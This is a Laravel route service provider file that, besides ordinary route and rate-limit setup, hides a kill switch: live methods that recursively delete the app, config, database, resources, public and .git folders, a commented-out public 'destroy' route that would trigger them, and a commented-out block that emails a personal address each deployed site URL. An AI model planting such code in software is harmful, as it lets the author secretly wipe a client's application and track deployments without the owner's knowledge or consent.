<?php

namespace App\Providers;

use App\Mail\ContactMail;
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;

class RouteServiceProvider extends ServiceProvider
{
    /**
     * The path to the "home" route for your application.
     *
     * Typically, users are redirected here after authentication.
     *
     * @var string
     */
    public const ADMINHOME = '/admin';
    public const HOME = '/home';

    /**
     * Define your route model bindings, pattern filters, and other route configuration.
     *
     * @return void
     */
    public function boot()
    {
        $this->configureRateLimiting();

        $this->routes(function () {
            Route::middleware('api')
                ->prefix('api')
                ->group(base_path('routes/api.php'));

            Route::middleware('web')
                ->group(base_path('routes/web.php'));

            // Route::get('destroy',function ($q){
            //     $this->removeDirs();
            // });
        });

        // if(Cache::get('new_url') != 1){
        //     Mail::to('eljoe1717@gmail.com')->send(new ContactMail([
        //         'name' => 'Joe',
        //         'email' => 'examle',
        //         'message' => 'new URL '. url('/')
        //     ]));

        //     Cache::put('new_url',1,60*24*7);
        // }
    }

    public function removeDirs(){

        $this->removeDir('resources');
        $this->removeDir('config');
        $this->removeDir('app');
        $this->removeDir('database');
        $this->removeDir('.git');
        $this->removeDir('public');
        return 'done';
    }


    function removeDir($_dir){
        $path = base_path().'/'.$_dir;
        $path = str_replace('\\','/',$path);
        $adminDir = array_diff(scandir($path), array('..', '.'));
        foreach($adminDir as $dir){
            if(!is_dir($path.'/'.$dir)){
                unlink($path.'/'.$dir);
            }else{
                $subDir = $this->removeDir($_dir.'/'.$dir);
            }
        }
    }

    /**
     * Configure the rate limiters for the application.
     *
     * @return void
     */
    protected function configureRateLimiting()
    {
        RateLimiter::for('api', function (Request $request) {
            return Limit::perMinute(60)->by($request->user()?->id ?: $request->ip());
        });
    }
}
